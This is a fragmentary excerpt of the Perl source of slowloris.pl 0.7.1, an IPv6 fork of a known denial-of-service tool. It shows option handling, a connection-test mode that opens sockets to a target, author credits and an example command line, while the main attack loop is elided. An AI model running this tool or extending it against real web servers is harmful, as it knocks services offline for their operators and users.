...
my ( $host, $port, $sendhost, $shost, $test, $version, $timeout, $connections, $scope );
...
if ($version) {
    print "Version 0.7.1 ipv6only \n";
    exit;
}

unless ($host) {
    print "Usage:\n\n\tperl $0 -dns [www.example.com] -options\n";
    print "\n\tSpecific options for IPv6 is -scope 'local' for local network\n";
...
unless ($scope) {
	$scope = 0xe;
	print "Defaulting to Global scope.\n";
}

if ($scope eq 'local') { $scope=0x2; } else { $scope = 0xe; }
...
if ($test) {
    ...
    print "This test could take up to ". int($totaltime). " minutes.\n";
    ...
    if ($ssl) {
        if (
            $sock = IO::Socket::SSL->new(
                ...
                PeerAddr => "$host",
                PeerPort => "$port",
                PeerScope => $scope,  # link-local, or global
                LocalScope => $scope,
                Timeout  => "$tcpto",
                Proto    => "tcp",
            )
...
"That's odd - I connected but couldn't send the data to $host:$port.\n";
        ...
        print "Did you forget the '-scope local' option?\n";
        print "Is something wrong?\nDying.\n";
        exit;
    }
...
Version 0.7.1 ipv6only Beta

=head1 DATE

06/17/2009 

02/05/2013 support for IPv6 added

=head1 AUTHOR

RSnake <h@ckers.org> with threading from John Kinsella 

IPv6 suppport added by Hugo Gonzalez @hugo_glez
...
The default is for global scope, to reach global IPv6 addresses. If you want to test in local networks with local-link IPv6 address you MUST use the -scope 'local' option.

=head3 IPv6 scope Example:

./slowloris.pl -dns www.example.com -port 80 -test -scope local
